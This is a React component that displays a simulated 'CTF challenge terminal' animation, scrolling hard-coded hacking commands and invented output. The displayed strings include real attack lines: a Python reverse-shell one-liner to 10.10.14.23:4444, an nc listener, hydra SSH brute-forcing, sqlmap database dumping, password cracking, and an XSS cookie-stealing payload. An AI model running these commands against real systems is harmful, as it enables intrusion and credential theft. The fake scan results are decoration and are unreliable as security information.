import { useEffect, useState, useRef } from 'react';
import styled, { keyframes } from 'styled-components';

const blink = keyframes`
  0%, 100% { opacity: 1; }
  50% { opacity: 0; }
`;

const scan = keyframes`
  0% { transform: translateY(0); }
  100% { transform: translateY(100%); }
`;

const TerminalContainer = styled.div`
  position: absolute;
  width: 80%;
  height: 60%;
  max-height: 500px;
  background-color: rgba(0, 0, 0, 0.7);
  border: 2px solid #00ff00;
  box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
  color: #00ff00;
  font-family: 'Courier New', monospace;
  font-size: 1.35rem;
  padding: 20px;
  overflow: hidden;
  z-index: 20;
  border-radius: 10px;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  opacity: 0.9;
  pointer-events: all;
  
  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(transparent 50%, rgba(0, 255, 0, 0.1) 50%);
    background-size: 100% 4px;
    pointer-events: none;
  }
  
  &::after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 4px;
    background: rgba(0, 255, 0, 0.3);
    animation: ${scan} 6s linear infinite;
    pointer-events: none;
  }
`;

const TerminalHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 10px;
  padding-bottom: 10px;
  border-bottom: 1px solid #00ff00;
`;

const TerminalTitle = styled.div`
  font-weight: bold;
  text-transform: uppercase;
`;

const TerminalControls = styled.div`
  display: flex;
  gap: 8px;
`;

const ControlButton = styled.button`
  width: 12px;
  height: 12px;
  border-radius: 50%;
  border: none;
  cursor: pointer;
  
  &:nth-child(1) {
    background-color: #ff0000;
  }
  
  &:nth-child(2) {
    background-color: #ffff00;
  }
  
  &:nth-child(3) {
    background-color: #00ff00;
  }
`;

const TerminalContent = styled.div`
  height: calc(100% - 30px);
  overflow-y: auto;
  overflow-x: hidden;
  white-space: pre-wrap;
  line-height: 1.4;
  
  &::-webkit-scrollbar {
    width: 5px;
  }
  
  &::-webkit-scrollbar-track {
    background: rgba(0, 255, 0, 0.1);
  }
  
  &::-webkit-scrollbar-thumb {
    background: rgba(0, 255, 0, 0.5);
  }
`;

const Cursor = styled.span`
  display: inline-block;
  width: 10px;
  height: 15px;
  background-color: #00ff00;
  animation: ${blink} 1s infinite;
  margin-left: 2px;
  vertical-align: middle;
`;

const CommandPrompt = styled.div`
  display: flex;
  margin-bottom: 8px;
  
  .prompt {
    color: #00ffff;
    margin-right: 8px;
  }
  
  .command {
    color: #ffffff;
  }
`;

const OutputLine = styled.div<{ color?: string }>`
  color: ${props => props.color || '#00ff00'};
  margin-bottom: 6px;
`;

interface HackingTerminalProps {
  isVisible: boolean;
  onClose: () => void;
}

export default function HackingTerminal({ isVisible, onClose }: HackingTerminalProps) {
  const [terminalLines, setTerminalLines] = useState<Array<{text: string, color?: string, isCommand?: boolean}>>([]);
  const contentRef = useRef<HTMLDivElement>(null);
  
  // CTF-style commands
  const commands = [
    'nmap -sV -p- --script=vuln 10.10.10.123', 
    'hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.123 ssh',
    'sqlmap -u "http://victim.site/page.php?id=1" --dbs --batch',
    'strings captured.pcap | grep "flag{"',
    'binwalk -e secret_firmware.bin',
    'john --format=bcrypt hashes.txt',
    'gobuster dir -u http://10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
    'steghide extract -sf suspicious.jpg',
    'hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt',
    'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
    'nc -lvnp 4444',
    'echo "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.23\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])" > shell.py'
  ];
  
  // CTF-style outputs
  const outputs = [
    { text: 'PORT     STATE SERVICE     VERSION', color: '#00ff00' },
    { text: '22/tcp   open  ssh         OpenSSH 7.6p1 (vulnerable to CVE-2020-14145)', color: '#ff0000' },
    { text: '80/tcp   open  http        Apache 2.4.29', color: '#00ff00' },
    { text: '443/tcp  open  ssl/https   Nginx 1.15.7', color: '#00ffff' },
    { text: '3306/tcp open  mysql       MySQL 5.7.32', color: '#ffff00' },
    { text: 'Found credentials: admin:SuperSecretPass123!', color: '#ff00ff' },
    { text: '[+] Found database: users, products, secrets, flags', color: '#00ffff' },
    { text: 'Dumping contents of table \'flags\'...', color: '#00ff00' },
    { text: 'flag{Th1s_1s_4_CTF_fl4g_f0r_y0u!}', color: '#ff0000' },
    { text: 'Hidden directory found: /admin, /backup, /dev', color: '#ffff00' },
    { text: 'Certificate information leaked: CN=admin@victim.com', color: '#00ffff' },
    { text: 'Binary contains hardcoded credentials at offset 0x45F8A1', color: '#ff00ff' },
    { text: 'Buffer overflow vulnerability found in login form', color: '#ff0000' },
    { text: 'SQL Injection: UNION SELECT 1,2,3,username,password FROM users', color: '#00ff00' },
    { text: 'XSS detected in search parameter: <script>alert(document.cookie)</script>', color: '#ffff00' },
    { text: 'Remote code execution achieved!', color: '#ff0000' },
    { text: 'Root privileges obtained. UID=0(root) GID=0(root)', color: '#ff0000' },
    { text: 'Secret file found: /etc/shadow (downloading...)', color: '#00ffff' },
    { text: 'Reverse shell established on 10.10.14.23:4444', color: '#00ff00' },
    { text: 'Decoding base64: echo "UGF5bG9hZCBkZWNvZGVkIHN1Y2Nlc3NmdWxseQ==" | base64 -d', color: '#00ffff' },
    { text: 'Memory analysis reveals potential key at 0xFFB43D21: "K3Y-F0UND-1N-M3M"', color: '#ffff00' },
    { text: 'Cracked password hash: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"', color: '#ff00ff' }
  ];
  
  // CTF challenge scenarios
  const ctfScenarios = [
    [
      { text: 'Starting Capture The Flag challenge: "Web Exploitation"', color: '#00ffff' },
      { text: 'Target: http://vulnerable.ctf/login.php', color: '#00ff00' },
      { text: 'sqlmap -u "http://vulnerable.ctf/login.php" --forms --dbs', isCommand: true },
      { text: '[*] testing for SQL injection vulnerability...', color: '#00ff00' },
      { text: '[+] SQL injection vulnerability found!', color: '#ff0000' },
      { text: '[+] available databases: [5]', color: '#00ff00' },
      { text: '    information_schema', color: '#ffff00' },
      { text: '    mysql', color: '#ffff00' },
      { text: '    performance_schema', color: '#ffff00' },
      { text: '    sys', color: '#ffff00' },
      { text: '    ctf_database', color: '#ff0000' },
      { text: 'sqlmap -u "http://vulnerable.ctf/login.php" -D ctf_database --tables', isCommand: true },
      { text: '[*] fetching tables for database: ctf_database', color: '#00ff00' },
      { text: '[+] retrieved: \'users\', \'products\', \'secrets\', \'flags\'', color: '#ff0000' },
      { text: 'sqlmap -u "http://vulnerable.ctf/login.php" -D ctf_database -T flags --dump', isCommand: true },
      { text: '[*] fetching entries for table \'flags\'', color: '#00ff00' },
      { text: '[+] flag column found: flag{SQLi_m4st3r_CTF_2023}', color: '#ff0000' },
      { text: 'Challenge completed! Points: 500', color: '#00ffff' }
    ],
    [
      { text: 'Starting Capture The Flag challenge: "Reverse Engineering"', color: '#00ffff' },
      { text: 'Target: mysterious_binary', color: '#00ff00' },
      { text: 'file mysterious_binary', isCommand: true },
      { text: 'mysterious_binary: ELF 64-bit LSB executable, x86-64, dynamically linked', color: '#00ff00' },
      { text: 'strings mysterious_binary | grep "flag"', isCommand: true },
      { text: 'No obvious flags found in plaintext', color: '#ffff00' },
      { text: 'gdb -q mysterious_binary', isCommand: true },
      { text: '(gdb) disassemble main', isCommand: true },
      { text: '0x00005555555551a9 <+0>:     push   %rbp', color: '#00ff00' },
      { text: '0x00005555555551aa <+1>:     mov    %rsp,%rbp', color: '#00ff00' },
      { text: '...', color: '#00ff00' },
      { text: '0x0000555555555234 <+139>:   call   0x555555555080 <check_password>', color: '#ff0000' },
      { text: '(gdb) disassemble check_password', isCommand: true },
      { text: '0x0000555555555080 <+0>:     push   %rbp', color: '#00ff00' },
      { text: '...', color: '#00ff00' },
      { text: '0x00005555555550b3 <+51>:    movabs $0x3448375f5075535f, %rax', color: '#ff0000' },
      { text: '0x00005555555550bd <+61>:    movabs $0x3372634e655f6d30, %rdx', color: '#ff0000' },
      { text: '0x00005555555550c7 <+71>:    mov    %rax,0x10(%rsp)', color: '#00ff00' },
      { text: '0x00005555555550cc <+76>:    mov    %rdx,0x18(%rsp)', color: '#00ff00' },
      { text: '(gdb) x/s 0x10(%rsp)', isCommand: true },
      { text: 'Converting hex values to ASCII...', color: '#00ffff' },
      { text: 'Discovered password: "SuP_57H4_0m_nEcr3"', color: '#ff0000' },
      { text: './mysterious_binary', isCommand: true },
      { text: 'Enter password: SuP_57H4_0m_nEcr3', isCommand: true },
      { text: 'Access granted! Flag: flag{R3v3rse_Eng1neeR1ng_PRO}', color: '#ff0000' },
      { text: 'Challenge completed! Points: 750', color: '#00ffff' }
    ]
  ];
  
  // Simulate terminal activity with CTF challenges
  useEffect(() => {
    if (!isVisible) return;
    
    const initialLines = [
      { text: 'Initializing CyberSec CTF Terminal v3.7.1...', color: '#00ffff' },
      { text: 'Connected to CTF Challenge Server', color: '#00ff00' },
      { text: 'Type "start_ctf" to begin a random challenge', color: '#ffff00' },
    ];
    
    setTerminalLines(initialLines);
    
    let timeout: NodeJS.Timeout;
    let currentScenario = Math.floor(Math.random() * ctfScenarios.length);
    let scenarioStep = 0;
    let inScenario = false;
    
    const simulateTerminal = () => {
      if (inScenario) {
        // Continue CTF scenario
        if (scenarioStep < ctfScenarios[currentScenario].length) {
          const step = ctfScenarios[currentScenario][scenarioStep];
          setTerminalLines(prev => [...prev, step]);
          scenarioStep++;
          
          // Scroll to bottom
          if (contentRef.current) {
            contentRef.current.scrollTop = contentRef.current.scrollHeight;
          }
          
          // Continue the simulation
          timeout = setTimeout(simulateTerminal, Math.random() * 800 + 500);
        } else {
          // End of scenario
          inScenario = false;
          timeout = setTimeout(simulateTerminal, 2000);
        }
      } else {
        // Random command
        const randomValue = Math.random();
        
        if (randomValue > 0.85) {
          // Start a CTF scenario
          inScenario = true;
          scenarioStep = 0;
          currentScenario = Math.floor(Math.random() * ctfScenarios.length);
          setTerminalLines(prev => [...prev, { text: 'start_ctf', isCommand: true }]);
          timeout = setTimeout(simulateTerminal, 1000);
        } else {
          // Regular command
          const command = commands[Math.floor(Math.random() * commands.length)];
          setTerminalLines(prev => [...prev, { text: command, isCommand: true }]);
          
          // Simulate processing time
          timeout = setTimeout(() => {
            // Random number of outputs
            const outputCount = Math.floor(Math.random() * 3) + 1;
            const newOutputs: Array<{text: string, color?: string, isCommand?: boolean}> = [];
            
            for (let i = 0; i < outputCount; i++) {
              const output = outputs[Math.floor(Math.random() * outputs.length)];
              newOutputs.push(output);
            }
            
            setTerminalLines(prev => [...prev, ...newOutputs]);
            
            // Scroll to bottom
            if (contentRef.current) {
              contentRef.current.scrollTop = contentRef.current.scrollHeight;
            }
            
            // Continue the simulation
            timeout = setTimeout(simulateTerminal, Math.random() * 3000 + 1000);
          }, Math.random() * 1000 + 500);
        }
      }
    };
    
    // Start simulation after initial delay
    timeout = setTimeout(simulateTerminal, 1000);
    
    return () => {
      clearTimeout(timeout);
    };
  }, [isVisible]);
  
  if (!isVisible) return null;
  
  return (
    <TerminalContainer>
      <TerminalHeader>
        <TerminalTitle>CTF Challenge Terminal v3.7.1</TerminalTitle>
        <TerminalControls>
          <ControlButton onClick={onClose} />
          <ControlButton />
          <ControlButton />
        </TerminalControls>
      </TerminalHeader>
      
      <TerminalContent ref={contentRef}>
        {terminalLines.map((line, index) => (
          line.isCommand ? (
            <CommandPrompt key={index}>
              <span className="prompt">ctf@cyberNet:~#</span>
              <span className="command">{line.text}</span>
            </CommandPrompt>
          ) : (
            <OutputLine key={index} color={line.color}>
              {line.text}
            </OutputLine>
          )
        ))}
        <CommandPrompt>
          <span className="prompt">ctf@cyberNet:~#</span>
          <Cursor />
        </CommandPrompt>
      </TerminalContent>
    </TerminalContainer>
  );
} 